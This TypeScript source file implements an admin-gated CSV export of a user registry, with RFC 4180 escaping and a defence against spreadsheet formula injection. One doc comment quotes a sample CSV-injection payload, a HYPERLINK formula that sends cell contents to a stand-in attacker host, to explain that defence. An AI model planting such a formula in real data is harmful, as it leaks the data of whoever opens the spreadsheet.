/**
 * Operator-only CSV export of the onboarding registry.
 *
 * `GET /api/admin/users` streams the whole `users` table back as a spreadsheet
 * the growth programme can open directly, because the alternative — handing an
 * operator a `psql` prompt against production every time they want the current
 * signup list — is a far worse thing to have to do routinely.
 *
 * The route is gated by `requireAdmin` before anything else runs: no query, no
 * log line, no timing signal that depends on the data. The rows themselves are
 * personal data (names, emails, wallets) and are never written to a log; only
 * the count is. Serialisation is hand-rolled rather than pulled from npm — the
 * format is a few lines of code, and the interesting part is the escaping,
 * which no general-purpose library would get right for our threat model anyway
 * (see `escapeField`).
 */

import { requireAdmin } from '@/lib/api/auth';
import { upstreamUnavailable } from '@/lib/api/errors';
import { log } from '@/lib/api/logger';
import { route } from '@/lib/api/route';
import { sql } from '@/lib/db';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

/**
 * The exported columns, in order.
 *
 * Named explicitly rather than derived from the returned rows so the file's
 * shape is decided here and not by whatever the table happens to contain: a
 * column added to `users` later cannot silently start appearing in the export.
 * `id` is deliberately absent — it is an internal surrogate key of no use to
 * anyone reading the spreadsheet.
 */
const COLUMNS = ['name', 'email', 'wallet', 'rating', 'note', 'source', 'created_at'];

/** Filename the browser saves the download as. */
const FILENAME = 'zentra-users.csv';

/** Characters that force a field to be quoted, per RFC 4180. */
const MUST_QUOTE = /[",\r\n]/;

/**
 * Leading characters a spreadsheet treats as the start of a formula.
 *
 * `-` is included even though a negative number is a perfectly ordinary value:
 * the export has no numeric columns where a leading minus is meaningful, so
 * defending the whole class costs nothing here.
 */
const FORMULA_PREFIX = /^[=+\-@]/;

export const GET = route('admin.users.export', async (request, { requestId }) => {
  requireAdmin(request, requestId);

  const rows = await readUsers(requestId);
  const csv = toCsv(rows, COLUMNS);

  // Row contents are personal data and never belong in a log drain; the count
  // is enough to answer "did the export actually return anything".
  log('info', 'admin.users.exported', { requestId, rows: rows.length });

  // `json()` is wrong here — this is a file download, not an envelope. The
  // response is built by hand so the body stays exactly the bytes we composed.
  return new Response(csv, {
    status: 200,
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="${FILENAME}"`,
      'cache-control': 'no-store',
    },
  });
});

/** Read the whole registry in signup order, oldest first. */
async function readUsers(requestId: string): Promise<Record<string, unknown>[]> {
  const db = sql();

  try {
    const rows = await db`
      SELECT name, email, wallet, rating, note, source, created_at
      FROM users
      ORDER BY created_at ASC
    `;
    // The driver types a tagged query as one of several row shapes, so the cast
    // is where we assert what this statement actually selects.
    return rows as unknown as Record<string, unknown>[];
  } catch (error) {
    // Driver messages routinely quote the failing statement and the connection
    // target, so the operator gets the log line and the caller gets nothing.
    log('error', 'admin.users.read', { requestId, err: error });
    throw upstreamUnavailable('Registry storage is temporarily unavailable.');
  }
}

/**
 * Serialise `rows` to an RFC 4180 CSV document with a leading header row.
 *
 * Only `columns` are emitted, in the order given; a key missing from a row is
 * an empty field rather than an error, so a partial `SELECT` still exports.
 */
function toCsv(rows: Record<string, unknown>[], columns: string[]): string {
  const lines = [columns.map(escapeField).join(',')];

  for (const row of rows) {
    lines.push(columns.map((column) => escapeField(render(row[column]))).join(','));
  }

  // CRLF is what the spec calls for and what Excel expects; every reader that
  // accepts bare LF accepts CRLF too, so this is the safer of the two.
  return lines.join('\r\n');
}

/**
 * Render one value as the text of a CSV field, before escaping.
 *
 * Absent values become an empty field rather than the strings "null" or
 * "undefined", which a spreadsheet would show as literal words. Timestamps come
 * back from the driver as `Date` objects and are written as ISO 8601 so the
 * export is unambiguous regardless of the reader's locale.
 */
function render(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  return String(value);
}

/**
 * Quote and neutralise one field so it survives both the CSV parser and Excel.
 *
 * Two separate problems are handled here, and only the first is about CSV.
 *
 * The formula guard is the non-obvious one. This file is downloaded and opened
 * in a spreadsheet, and Excel, LibreOffice and Sheets all interpret a cell
 * beginning with `=`, `+`, `-` or `@` as a formula rather than text. A user who
 * signs up with the name `=HYPERLINK("http://attacker/?d="&A1,"click")` has
 * written nothing dangerous into our database — the payload only becomes code
 * at the moment an operator opens the export, on the operator's machine, with
 * the operator's data in reach. That is CSV injection, and the field is
 * defused by prefixing a single quote, which every spreadsheet reads as "the
 * rest of this cell is literal text". The quote is added before the quoting
 * decision below, not after, so it lands inside the quotes where it belongs.
 *
 * The rest is ordinary RFC 4180: a field containing a comma, a double quote,
 * CR or LF is wrapped in double quotes, and any inner double quote is doubled.
 */
function escapeField(value: string): string {
  const guarded = FORMULA_PREFIX.test(value) ? `'${value}` : value;
  if (!MUST_QUOTE.test(guarded)) return guarded;
  return `"${guarded.replace(/"/g, '""')}"`;
}
